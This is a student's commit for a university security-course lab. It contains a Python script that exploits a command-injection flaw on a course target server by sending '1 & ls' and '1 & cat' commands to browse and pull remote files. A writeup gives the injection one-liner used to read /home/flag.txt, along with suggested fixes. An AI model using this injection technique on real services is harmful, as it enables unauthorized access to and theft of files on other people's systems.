cfd1f25cb680b40e70688012e4224157b9527f15
ReznikovEgor <ReznikovEgorCS@gmail.com>
2019-10-04 23:01:37 -0400

    completed assignment 4

--- week/4/stub.py
+++ week/4/stub.py
@@ -1,37 +1,191 @@
-"""
-    Use the same techniques such as (but not limited to):
-        1) Sockets
-        2) File I/O
-        3) raw_input()
-
-    from the OSINT HW to complete this assignment. Good luck!
-"""
-
 import socket
+import re
 
-host = "wattsamp.net" # IP address here
-port = 1337 # Port here
+host = "157.230.179.99"
+port = 1337
 
-def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/3/library/socket.html
-        How to use the socket s:
+def shell():
 
-            # Establish socket connection
+    menu_cmd = ""
+    
+    
+    #Will run until the user types in "quit"
+    while menu_cmd != "quit":
+        path = "/"
+        shell_cmd = ""
+        menu_cmd = input(">")
+
+        #Prints the commands that can be used in the menu of the script
+        if menu_cmd == "help":
+            print("shell Drop into an interactive shell and allow users to gracefully exit")
+            print("pull <remote-path> <local-path> Download files")
+            print("help Shows this help menu")
+            print("quit Quit the shell")
+        elif menu_cmd[0:4] == "pull":
+            file_split = menu_cmd.split()
+            remote_path = file_split[1]
+            local_path = file_split[2]
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, port))
-
-            Reading:
-
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
+            s.recv(1024)
+            pull_cmd = "1 & cat " + remote_path + '\n'
+            s.send(pull_cmd.encode())
+            file_txt = s.recv(1024).decode()
+            output_file = open(local_path, "w")
+            output_file.write(file_txt)
 
 
-if __name__ == '__main__':
-    print("IMPLEMENT ME")
+        
+        elif menu_cmd == "shell":
+            while "exit" not in shell_cmd:
+                
+                shell_cmd = input(path+">")
+                
+                if shell_cmd == "cd":
+                    print("invalid")
+
+                elif "&" in shell_cmd:
+                    mult_shell_cmd = shell_cmd.split(" & ")
+                    for curr_cmd in mult_shell_cmd:
+                        if "cd" in curr_cmd:
+                            temp_path = path
+                            new_path = curr_cmd.split("cd ", 1)[1]
+                            new_path = new_path.split(' ', 2)
+                            if "/" in new_path[0]:
+                                new_path[0] = new_path[0].split("/")
+                                valid_path = True
+                                
+                                for dirs in new_path[0]:
+                                    if dirs == "..":
+                                        temp_path = re.sub(r'[a-zA-Z]+$',"" ,path)
+                                    
+                                    if dirs and ".." not in dirs:
+                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                        s.connect((host, port))
+                                        s.recv(1024)
+                                        dir_check = "1 & ls "+ temp_path +"\n"
+                                        s.send(dir_check.encode())
+                                        curr_dirs = s.recv(1024).decode()
+                                        if dirs not in curr_dirs:
+                                            valid_path = False
+                                        else:
+                                            if re.search(r'[a-zA-Z]+$',temp_path):
+                                                temp_path = temp_path +"/"+dirs
+                                            else:
+                                                temp_path = temp_path + dirs
+                                if not valid_path:
+                                    temp_path = path
+                                else:
+                                    path = temp_path
+                                    temp_path = path
+                            elif ".." == new_path[0]:
+                                if re.search(r'/[a-zA-Z]+$',path[1:]):
+                                    path = re.sub(r'/[a-zA-Z]+$',"",path)
+                                else:
+                                    path = re.sub(r'[a-zA-Z]+$',"",path)
+                            
+                            else:
+                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                s.connect((host, port))
+                                s.recv(1024)
+                                dir_check = "1 & ls "+ path +"\n"
+                                s.send(dir_check.encode())
+                                curr_dirs = s.recv(1024).decode()
+                                if new_path[0] not in curr_dirs:
+                                    print("Invalid directory")
+                                else:
+                                    if re.search(r'[a-zA-Z]+$',path):
+                                        path = path + "/" + new_path[0]
+                                    else:
+                                        path = path + new_path[0]
+                        
+                        elif "ls" == curr_cmd:
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            s.connect((host, port))
+                            s.recv(1024)
+                            ls_cmd = "1 & ls " + path +"\n"
+                            s.send(ls_cmd.encode())
+                            curr_dirs = s.recv(1024).decode()
+                            print(curr_dirs)
+
+                        else:
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            s.connect((host, port))
+                            s.recv(1024)
+                            test = curr_cmd.split()
+                            s.send(("1 & " + test[0] + " " + path + "/" + test[1] +"\n").encode())
+                            print(s.recv(1024).decode())
+                else:
+                    if "cd" in shell_cmd:
+                            temp_path = path
+                            new_path = shell_cmd.split("cd ", 1)[1]
+                            new_path = new_path.split(' ', 2)
+                            if "/" in new_path[0]:
+                                new_path[0] = new_path[0].split("/")
+                                valid_path = True
+                                
+                                for dirs in new_path[0]:
+                                    if dirs == "..":
+                                        temp_path = re.sub(r'[a-zA-Z]+$',"" ,path)
+                                    
+                                    if dirs and ".." not in dirs:
+                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                        s.connect((host, port))
+                                        s.recv(1024)
+                                        dir_check = "1 & ls "+ temp_path +"\n"
+                                        s.send(dir_check.encode())
+                                        curr_dirs = s.recv(1024).decode()
+                                        if dirs not in curr_dirs:
+                                            valid_path = False
+                                        else:
+                                            if re.search(r'[a-zA-Z]+$',temp_path):
+                                                temp_path = temp_path +"/"+dirs
+                                            else:
+                                                temp_path = temp_path + dirs
+                                            
+                                if not valid_path:
+                                    temp_path = path
+                                else:
+                                    path = temp_path
+                                    temp_path = path
+                            elif ".." == new_path[0]:
+                                if re.search(r'/[a-zA-Z]+$',path[1:]):
+                                    path = re.sub(r'/[a-zA-Z]+$',"",path)
+                                else:
+                                    path = re.sub(r'[a-zA-Z]+$',"",path)
+                            
+                            
+                            else:
+                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                s.connect((host, port))
+                                s.recv(1024)
+                                dir_check = "1 & ls "+ path +"\n"
+                                s.send(dir_check.encode())
+                                curr_dirs = s.recv(1024).decode()
+                                if new_path[0] not in curr_dirs:
+                                    print("Invalid directory")
+                                else:
+                                    if re.search(r'[a-zA-Z]+$',path):
+                                        path = path + "/" + new_path[0]
+                                    else:
+                                        path = path + new_path[0]
+                        
+                    elif "ls" == shell_cmd:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((host, port))
+                        s.recv(1024)
+                        ls_cmd = "1 & ls " + path +"\n"
+                        s.send(ls_cmd.encode())
+                        curr_dirs = s.recv(1024).decode()
+                        print(curr_dirs) 
+                    else:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((host, port))
+                        s.recv(1024)
+                        test = shell_cmd.split()
+                        s.send(("1 & " + test[0] + " " + path + "/" + test[1] +"\n").encode())
+                        print(s.recv(1024).decode())
+            
+
+            
+shell()
--- week/4/writeup/README.md
+++ week/4/writeup/README.md
@@ -1,18 +1,23 @@
 # Writeup 2 - Pentesting
 
-Name: *PUT YOUR NAME HERE*
-Section: *PUT YOUR SECTION NUMBER HERE*
+Name: Egor Reznikov
+Section: 0101
 
 I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.
 
-Digital acknowledgement: *PUT YOUR NAME HERE*
+Digital acknowledgement: Egor Reznikov
 
 ## Assignment Writeup
 
 ### Part 1 (45 pts)
+CMSC389R-{p1ng_as_a_$erv1c3}
 
-*Please use this space to writeup your answers and solutions (and how you found them!) for part 1.*
+nc wattsamp.net 1337 -> 157.230.179.99 & cat /home/flag.txt
+
+The first thing I looked at was what would happen if I ran nc wattsamp.net 1337. This prompted me to input the ip address. Since we know that wattsamp.net is vulnerable to command injection I tried inputing the ip & ls to see what would show up. This showed me a list of directories that was similar to the one in assignment 2. The first directory I checked for flag.txt was /home/ since that's where it was before. Luckily it was there again and I was able to find the flag by inputing 157.230.179.99 & cat /home/flag.txt after running nc wattsamp.net 1337. Eric could create a whitelist for allowed commands and/or character so that you can not use the &, |, or ; operator. These need to be fixed or other hackers would be able to access their directory and obtain valuable information from wattsamp.net directory.
+While doing part 2, I found out that you do not have to input the whole ip address. To command inject, you can just input 1 & cmd after using ncat. This is another issue that should be fixed, you are able to access the directory without knowing the ip, so requiring the exact ip address could provide some security. The main way to stop the command injection is by having a login before accessing the home directory. You need to have usernames and more complex password requirements such as having a minimum for numbers, upper/lower letters, and special characters. Another thing that would help with security that the University of Maryland does is require a change of password every few months. Another security provision that UMD uses is two-factor authentication might also help security and not allow malicious hackers to access information since the user has a different account to verify their login. Also this would show if someone has attempted to login who is not authorized.
+
 
 ### Part 2 (55 pts)
 
-*Please use this space to detail your approach and solutions for part 2. Don't forget to upload your completed source code to this /writeup directory as well!*
+For this part, the main thing I need to keep track up is the path. You need to keep track of where you are in the directory so that you can look around all the different directories. Cd is the command used for traversing and there are several ways to use cd such cd .. and cd bin/systemd. I used different cases to cover .. slashes after cd and you always have to check that a directory is valid. Another issue that I had to cover was if you were going to use multiple commands in one line, Ex. cd home & ls & cat home/flag.txt. Whenever ls was used, I used the current path and sent "1 & ls curr_path" so that it would display the content of the current directory without showing the user having to see the request for the ip address and having to nc. If the user exited the shell using "exit", the path would reset to the default path. Showing the help menu was simple, since it was only 4 print statments. For pull, I needed to use cat to see what was in the txt file using the <remote-path> and write the text into a txt file to where the <local-path> was.
